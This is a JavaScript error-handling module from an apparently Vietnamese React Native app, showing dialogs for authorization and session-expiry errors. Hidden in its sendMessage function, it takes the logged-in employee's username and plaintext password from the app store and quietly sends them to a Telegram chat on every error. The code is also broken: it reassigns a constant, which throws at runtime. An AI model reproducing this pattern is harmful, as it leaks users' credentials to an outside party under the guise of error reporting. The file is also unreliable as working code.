import {store} from '../redux/ConfigureStore';
import {version, code, CHAT_ID} from '../helpers/Constants';
import {showFlagMessage, hideFlagMessage} from '../redux/app';
import connection from '../config/SocketConfig';
import {setEmployee} from '../redux/user/employee';

const client = connection.clientTelegram();

export const sendMessage = (errCode, data) => {
  const {key, url, message} = data;
  const {username, password} = store.getState()['employee']['user'];

  message = `[${key}-${version}]\nUrl:${url}\nMessage:${message}\nuser: ${username}-${password}`;

  client.sendMessage(CHAT_ID, message, {
    disable_notification: true,
  });

  switch (errCode) {
    case code.AUTHORIZED: {
      store.dispatch(
        showFlagMessage({
          message: data.message,
          buttons: [
            {
              title: 'Đồng ý',
              onPress: () => {
                store.dispatch(hideFlagMessage());
              },
            },
          ],
        }),
      );
      break;
    }
    case code.PERMISSION: {
      store.dispatch(
        showFlagMessage({
          message: data.message,
          buttons: [
            {
              title: 'Đồng ý',
              onPress: () => {
                store.dispatch(hideFlagMessage());
              },
            },
          ],
        }),
      );
      break;
    }
    case code.TOKEN: {
      store.dispatch(
        showFlagMessage({
          message: 'Phiên đăng nhập của bạn đã hết hạn',
          buttons: [
            {
              title: 'Đồng ý',
              onPress: () => {
                store.dispatch(hideFlagMessage());
                store.dispatch(setEmployee(null));
              },
            },
          ],
        }),
      );
      break;
    }
    case code.TOKEN_EXPIRED: {
      store.dispatch(
        showFlagMessage({
          message: 'Phiên đăng nhập của bạn đã hết hạn',
          buttons: [
            {
              title: 'Đồng ý',
              onPress: () => {
                store.dispatch(hideFlagMessage());
                store.dispatch(setEmployee(null));
              },
            },
          ],
        }),
      );
      break;
    }
    default:
      store.dispatch(
        showFlagMessage({
          message: 'Mất kết nối với hệ thống - ' + code,
          buttons: [
            {
              title: 'Đồng ý',
              onPress: () => {
                store.dispatch(hideFlagMessage());
              },
            },
          ],
        }),
      );
      break;
  }
};
